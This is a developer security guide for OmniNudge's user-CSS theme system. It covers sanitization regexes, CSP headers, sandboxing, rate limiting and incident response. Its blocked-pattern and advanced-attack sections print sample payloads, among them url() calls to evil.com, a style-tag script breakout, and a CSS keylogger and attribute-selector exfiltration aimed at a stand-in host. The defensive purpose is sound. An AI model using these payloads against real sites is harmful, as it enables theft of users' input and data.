# Security Guidelines - Theme Customization

Security guidelines and best practices for OmniNudge's theme customization system.

**Last Updated:** 2025-11-29
**For Phase:** 2+
**Audience:** Developers, Security Reviewers, Advanced Users

---

## Table of Contents

1. [Overview](#overview)
2. [Threat Model](#threat-model)
3. [CSS Sanitization](#css-sanitization)
4. [Content Security Policy](#content-security-policy)
5. [Phase 2 vs Phase 3 Security](#phase-2-vs-phase-3-security)
6. [Rate Limiting](#rate-limiting)
7. [Marketplace Security](#marketplace-security)
8. [Best Practices](#best-practices)
9. [Security Checklist](#security-checklist)
10. [Incident Response](#incident-response)

---

## Overview

OmniNudge's theme customization system allows users to write custom CSS (Phase 2) and HTML+CSS (Phase 3) to personalize their experience. While this provides powerful customization, it introduces security risks that must be carefully managed.

### Core Security Principles

1. **Defense in Depth** - Multiple layers of security
2. **Least Privilege** - Minimal permissions by default
3. **Fail Secure** - Errors result in safe defaults
4. **Transparency** - Users understand what themes can do
5. **Server-Side Validation** - Never trust client input

### Security Guarantees

**Phase 2 (CSS Only):**
- ✅ No JavaScript execution possible
- ✅ No external resource loading
- ✅ No data exfiltration
- ✅ No XSS vulnerabilities
- ✅ Layout-only modifications

**Phase 3 (HTML + CSS):**
- ✅ Sandboxed iframe execution
- ✅ No JavaScript allowed
- ✅ No form submissions to external sites
- ✅ No cookie access
- ✅ Limited DOM access

---

## Threat Model

### What We're Protecting Against

1. **Cross-Site Scripting (XSS)**
   - Malicious JavaScript in CSS/HTML
   - Data theft (tokens, messages, user data)
   - Session hijacking
   - Keylogging

2. **Data Exfiltration**
   - Sending user data to external servers
   - CSS-based timing attacks
   - Background image tracking pixels

3. **Clickjacking**
   - Invisible overlays capturing clicks
   - UI redressing attacks
   - Fake login forms

4. **Denial of Service**
   - Infinite animations causing browser hangs
   - Large CSS files consuming memory
   - Expensive selectors slowing rendering

5. **Social Engineering**
   - Themes that mimic security warnings
   - Fake admin interfaces
   - Phishing attempts

### What We're NOT Protecting Against

- User creating ugly themes
- Themes that make UI hard to use (user choice)
- Copyright infringement (user responsibility)
- Themes that violate taste or decorum

---

## CSS Sanitization

### Sanitization Strategy

All user-submitted CSS passes through server-side sanitization before storage and application.

### Blocked Patterns

#### 1. URL Loading

**Threat:** External resource loading, tracking pixels, data exfiltration

**Blocked:**
```css
/* All blocked */
background: url('https://evil.com/track.png');
background-image: url(data:image/svg+xml,...);
content: url('javascript:alert(1)');
list-style-image: url('/etc/passwd');
cursor: url('https://track.com/cursor.png'), auto;
@import url('https://evil.com/steal.css');
```

**Implementation:**
```go
// Regex pattern
var urlPattern = regexp.MustCompile(`url\s*\([^)]*\)`)

if urlPattern.MatchString(css) {
    return errors.New("CSS contains forbidden url() function")
}
```

#### 2. @import Statements

**Threat:** Loading external stylesheets, cascading attacks

**Blocked:**
```css
@import 'https://evil.com/malicious.css';
@import url('attack.css');
```

**Implementation:**
```go
var importPattern = regexp.MustCompile(`@import`)

if importPattern.MatchString(css) {
    return errors.New("CSS contains forbidden @import statement")
}
```

#### 3. JavaScript Execution

**Threat:** XSS via CSS-based JavaScript execution (legacy IE, edge cases)

**Blocked:**
```css
/* IE-specific attacks */
behavior: url(xss.htc);
-moz-binding: url('http://evil.com/xss.xml#xss');
expression(alert('XSS'));

/* Event handlers */
background: url('javascript:alert(1)');
```

**Implementation:**
```go
var jsPatterns = []*regexp.Regexp{
    regexp.MustCompile(`(?i)javascript\s*:`),
    regexp.MustCompile(`(?i)expression\s*\(`),
    regexp.MustCompile(`(?i)behavior\s*:`),
    regexp.MustCompile(`(?i)-moz-binding\s*:`),
    regexp.MustCompile(`(?i)vbscript\s*:`),
}

for _, pattern := range jsPatterns {
    if pattern.MatchString(css) {
        return errors.New("CSS contains forbidden JavaScript pattern")
    }
}
```

#### 4. CSS Injection Attacks

**Threat:** Breaking out of style context, injecting HTML

**Blocked:**
```css
/* Attempting to close style tag and inject HTML */
</style><script>alert('XSS')</script><style>

/* Attempting to inject new selectors */
; } body { display: none; } /* {
```

**Implementation:**
```go
// Block HTML tags
var htmlTagPattern = regexp.MustCompile(`<[^>]*>`)

if htmlTagPattern.MatchString(css) {
    return errors.New("CSS contains HTML tags")
}

// Ensure balanced braces
openBraces := strings.Count(css, "{")
closeBraces := strings.Count(css, "}")

if openBraces != closeBraces {
    return errors.New("CSS has unbalanced braces")
}
```

### Allowed CSS

**Safe CSS includes:**
- All standard CSS properties
- Pseudo-classes and pseudo-elements
- CSS animations and transitions
- CSS Grid and Flexbox
- CSS variables (custom properties)
- Media queries
- Keyframe animations

**Example of valid CSS:**
```css
:root {
  --primary-color: #3B82F6;
  --spacing: 1rem;
}

.feed-post-card {
  background: var(--primary-color);
  padding: var(--spacing);
  border-radius: 12px;
  transition: transform 300ms ease;
}

.feed-post-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
}

@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}

@media (max-width: 768px) {
  .feed-post-card {
    padding: calc(var(--spacing) / 2);
  }
}
```

---

## Content Security Policy

### CSP Headers

OmniNudge implements strict Content Security Policy headers to prevent XSS even if sanitization fails.

**Current CSP (Phase 2):**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  font-src 'self';
  connect-src 'self' wss://omninudge.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

**What this prevents:**
- `script-src 'self'` - Only scripts from our domain
- `style-src 'unsafe-inline'` - Inline styles allowed (for user CSS) but no external stylesheets
- `frame-src 'none'` - No iframes (prevents clickjacking)
- `object-src 'none'` - No Flash, plugins
- `form-action 'self'` - Forms only submit to our domain

### Phase 3 CSP (HTML + CSS)

In Phase 3, when HTML customization is allowed, themes will be sandboxed:

```html
<iframe
  sandbox="allow-same-origin"
  csp="default-src 'none'; style-src 'unsafe-inline';"
  srcdoc="<!-- user HTML here -->"
></iframe>
```

**Sandbox attributes:**
- `allow-same-origin` - Access to cookies (needed for auth)
- No `allow-scripts` - JavaScript completely disabled
- No `allow-forms` - Form submission disabled
- No `allow-top-navigation` - Can't redirect main window

---

## Phase 2 vs Phase 3 Security

### Phase 2: CSS Only (Current)

**Security Model:**
- User CSS applied directly to DOM
- Server-side sanitization removes dangerous patterns
- CSP prevents script execution
- No user-provided HTML

**Attack Surface:**
- CSS injection (mitigated by sanitization)
- CSS-based DoS (mitigated by size limits, performance monitoring)
- Visual spoofing (user responsibility)

**Risk Level:** ⚠️ Low to Medium

### Phase 3: HTML + CSS (Future)

**Security Model:**
- User HTML rendered in sandboxed iframe
- Strict CSP within iframe
- No JavaScript allowed in sandbox
- Limited communication with parent window

**Attack Surface:**
- XSS in iframe (mitigated by sandbox + CSP)
- Clickjacking iframe content (mitigated by CSP)
- Data exfiltration via HTML (mitigated by CSP)

**Risk Level:** ⚠️⚠️ Medium to High

**Why Phase 3 is More Dangerous:**
1. HTML can contain hidden form fields
2. More complex sanitization required
3. Larger attack surface
4. Potential for iframe escape exploits

**Additional Phase 3 Protections:**
- HTML sanitization library (bluemonday or similar)
- Whitelist of allowed HTML tags
- Attribute filtering (no `onclick`, etc.)
- More aggressive CSP in sandbox
- Regular security audits

---

## Rate Limiting

### Theme Creation/Update Limits

**Purpose:** Prevent abuse, resource exhaustion, automated attacks

**Limits:**
- **10 theme saves per hour** per user
- **50 theme previews per hour** per user
- **3 marketplace submissions per day** per user

**Implementation:**
```go
// Token bucket algorithm
type RateLimiter struct {
    tokens     int
    maxTokens  int
    refillRate time.Duration
    lastRefill time.Time
}

func (rl *RateLimiter) Allow() bool {
    rl.refill()
    if rl.tokens > 0 {
        rl.tokens--
        return true
    }
    return false
}
```

**HTTP Headers:**
```
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 1640000000
```

### Theme Download Limits

**Purpose:** Prevent scraping, bandwidth abuse

**Limits:**
- **100 theme downloads per hour** per user
- **500 theme previews per hour** per IP

---

## Marketplace Security

### Theme Review Process

All marketplace themes undergo manual review:

**Automated Checks:**
1. CSS sanitization (same as user themes)
2. File size limits (max 100KB)
3. Profanity filter on names/descriptions
4. Duplicate detection

**Manual Review:**
1. Visual inspection of theme
2. Check for misleading UI elements
3. Verify theme works as described
4. Test on multiple pages
5. Check for copyright violations

**Review SLA:** 24-48 hours

### Marketplace Ratings

**User Feedback:**
- 5-star rating system
- Written reviews
- "Report Theme" button

**Automatic Removal Triggers:**
- Average rating < 2.0 stars with 10+ reviews
- 3+ reports for security issues
- Developer account suspended

### Malicious Theme Response

If a malicious theme is discovered:

1. **Immediate Actions:**
   - Theme removed from marketplace
   - Theme disabled for all users
   - Users notified via email
   - Developer account suspended

2. **Investigation:**
   - Analyze theme for attack vector
   - Check if sanitization failed
   - Review other themes from same developer
   - Check for data breaches

3. **Remediation:**
   - Update sanitization rules
   - Deploy hotfix if needed
   - Improve review process
   - Public disclosure if warranted

---

## Best Practices

### For Users

**Creating Themes:**
1. ✅ Test themes thoroughly before publishing
2. ✅ Use CSS variables for maintainability
3. ✅ Add comments explaining complex CSS
4. ✅ Check contrast ratios for accessibility
5. ❌ Don't try to bypass sanitization
6. ❌ Don't create misleading UI elements
7. ❌ Don't steal other users' themes

**Installing Themes:**
1. ✅ Check theme ratings and reviews
2. ✅ Preview before installing
3. ✅ Report suspicious themes
4. ✅ Only install from trusted creators
5. ❌ Don't install themes that look too good to be true
6. ❌ Don't share themes that might violate ToS

### For Developers

**Backend:**
1. ✅ Always sanitize CSS server-side
2. ✅ Never trust client input
3. ✅ Use parameterized queries (SQL injection prevention)
4. ✅ Log all theme operations for audit
5. ✅ Implement rate limiting
6. ✅ Set strict CSP headers
7. ❌ Don't store unsanitized CSS
8. ❌ Don't render user CSS without sanitization
9. ❌ Don't skip validation for "trusted" users

**Frontend:**
1. ✅ Escape user-generated content
2. ✅ Use React's built-in XSS protection
3. ✅ Validate theme structure before applying
4. ✅ Provide user feedback on errors
5. ❌ Don't use `dangerouslySetInnerHTML` for theme CSS
6. ❌ Don't bypass React's escaping

---

## Security Checklist

### Before Launch (Phase 2)

**Backend:**
- [ ] CSS sanitization implemented and tested
- [ ] Rate limiting configured
- [ ] CSP headers set correctly
- [ ] Database stores only sanitized CSS
- [ ] Theme size limits enforced (100KB max)
- [ ] SQL injection tests passed
- [ ] XSS tests passed (OWASP Top 10)

**Frontend:**
- [ ] Theme preview sandboxed
- [ ] User CSS applied safely
- [ ] No `dangerouslySetInnerHTML` for themes
- [ ] Error handling for invalid CSS
- [ ] Loading states for theme application

**Testing:**
- [ ] Attempted to inject JavaScript via CSS
- [ ] Attempted to load external resources
- [ ] Attempted SQL injection in theme names
- [ ] Tested with malformed CSS
- [ ] Tested with oversized CSS
- [ ] Tested rate limiting bypass attempts

**Documentation:**
- [ ] Security guidelines published
- [ ] User ToS includes theme policy
- [ ] Developer documentation includes security section
- [ ] Incident response plan documented

---

### Before Phase 3 Launch (HTML + CSS)

**Additional Requirements:**
- [ ] HTML sanitization library integrated (bluemonday)
- [ ] Iframe sandboxing implemented
- [ ] Whitelist of allowed HTML tags defined
- [ ] Attribute filtering functional
- [ ] Stricter CSP in sandbox tested
- [ ] Security audit completed by third party
- [ ] Penetration testing performed
- [ ] Bug bounty program launched

---

## Incident Response

### Severity Levels

**Critical (P0):**
- XSS vulnerability allowing account takeover
- Data exfiltration vulnerability
- Remote code execution

**High (P1):**
- CSS injection bypassing sanitization
- Marketplace theme stealing user data
- Theme causing browser crashes

**Medium (P2):**
- Visual spoofing attacks
- Theme performance issues
- Rate limiting bypass

**Low (P3):**
- Cosmetic issues
- Documentation errors
- Minor UX problems

### Response Procedures

**P0/P1 Incidents:**
1. **Immediate (< 1 hour):**
   - Disable theme system entirely if needed
   - Remove malicious themes
   - Revoke affected sessions
   - Notify security team

2. **Short-term (< 24 hours):**
   - Develop and deploy hotfix
   - Analyze attack vector
   - Check logs for compromised accounts
   - Prepare user communication

3. **Long-term (< 1 week):**
   - Public disclosure if user data affected
   - Update documentation
   - Improve sanitization
   - Post-mortem analysis

**P2/P3 Incidents:**
- Standard bug fix workflow
- Deploy in next release
- Update documentation

### Reporting Security Issues

**For Security Researchers:**
- Email: security@omninudge.com
- PGP key available on website
- Bug bounty program (Phase 3)
- Responsible disclosure: 90 days

**For Users:**
- "Report Theme" button in marketplace
- Email: support@omninudge.com
- In-app support chat

---

## Advanced Attacks and Mitigations

### CSS-Based Timing Attacks

**Attack:** Use CSS selectors to detect presence of elements, exfiltrate data character-by-character

**Example:**
```css
/* If input value starts with 'a', load background image */
input[value^="a"] {
  background: url('https://evil.com/track?char=a');
}
```

**Mitigation:**
- Block all `url()` functions
- No attribute selectors on sensitive inputs
- CSP blocks external requests

### CSS Keylogger

**Attack:** Detect key presses using CSS attribute selectors

**Example:**
```css
input[value$="a"] { background: url('https://evil.com/log?key=a'); }
input[value$="b"] { background: url('https://evil.com/log?key=b'); }
/* ... for all characters */
```

**Mitigation:**
- Block all `url()` functions
- CSP prevents external requests
- Input values not exposed to user CSS scope

### Unicode Bidirectional Override

**Attack:** Use Unicode characters to make malicious CSS look benign

**Example:**
```css
/* Looks normal but contains hidden right-to-left override */
.button /* ‮ */ { background: red; } /* { background: evil-url(); } ‭ */
```

**Mitigation:**
- Strip non-ASCII control characters
- Validate UTF-8 encoding
- Limit allowed character set

### CSS Infinity Loop

**Attack:** Create infinite animations causing browser hang

**Example:**
```css
@keyframes infinite {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360000000deg); }
}

* {
  animation: infinite 0.00001s infinite;
}
```

**Mitigation:**
- Monitor client-side performance
- Limit animation complexity
- Allow users to disable themes easily
- Server-side static analysis of CSS

---

## Compliance

### GDPR Considerations

**User Data in Themes:**
- Themes are user-generated content
- Users own their themes
- Themes can be exported (data portability)
- Themes deleted when account deleted (right to erasure)

**Marketplace Themes:**
- Public themes are public content
- License agreement on upload
- Creator can delete at any time
- Platform can remove for violations

### COPPA Compliance

If allowing users under 13:
- No public sharing of themes
- Parental consent required for marketplace
- Limited customization options

### Accessibility (WCAG 2.1)

**Platform Responsibility:**
- Default theme is WCAG AA compliant
- Provide contrast checking tools
- Warn users if theme fails accessibility

**User Responsibility:**
- Custom themes may not meet standards
- Users accept accessibility risks
- Platform not liable for user themes

---

## Future Enhancements

### Phase 3+ Security Features

1. **Client-Side Scanning:**
   - Real-time CSS analysis in browser
   - Warn users before applying risky themes

2. **Machine Learning Detection:**
   - Train models on malicious CSS patterns
   - Automated flagging of suspicious themes

3. **Reputation System:**
   - Trusted theme creators verified badge
   - History of safe themes increases trust score

4. **Sandboxed Preview:**
   - Completely isolated environment for testing
   - No access to real user data

5. **Bug Bounty Program:**
   - Reward security researchers
   - Incentivize vulnerability discovery
   - Continuous security improvement

---

## Resources

### Tools

**CSS Validation:**
- [W3C CSS Validator](https://jigsaw.w3.org/css-validator/)
- [CSSLint](http://csslint.net/)

**Security Testing:**
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [XSS Hunter](https://xsshunter.com/)

**Accessibility:**
- [WAVE](https://wave.webaim.org/)
- [Axe DevTools](https://www.deque.com/axe/devtools/)

### Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [CSS Security by Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Sandboxing in Web Browsers](https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/)

---

**Remember:** Security is an ongoing process, not a one-time implementation. Stay vigilant, update sanitization rules as new attack vectors emerge, and always prioritize user safety.

**Last Updated:** 2025-11-29
**Version:** 1.0
**Status:** Phase 2 Ready
